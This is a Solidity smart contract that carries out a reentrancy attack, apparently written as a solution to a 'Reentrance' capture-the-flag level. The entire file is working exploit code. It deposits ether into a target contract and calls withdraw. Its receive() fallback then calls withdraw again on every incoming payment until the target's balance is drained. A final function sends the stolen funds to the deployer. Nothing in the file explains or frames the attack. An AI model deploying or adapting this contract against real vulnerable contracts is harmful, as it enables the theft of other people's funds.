
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

contract ReentranceAttacker {
    IReentrance public reentranceContract;
    address public owner;

    constructor(address _reentranceAddress) public {
        reentranceContract = IReentrance(_reentranceAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        reentranceContract.donate{value: msg.value}(address(this));
        reentranceContract.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentranceContract).balance > 0) {
            reentranceContract.withdraw(reentranceContract.balanceOf(address(this)));
        }
    }

    function withdrawAttackerBalance() public {
        payable(owner).transfer(address(this).balance);
    }
}
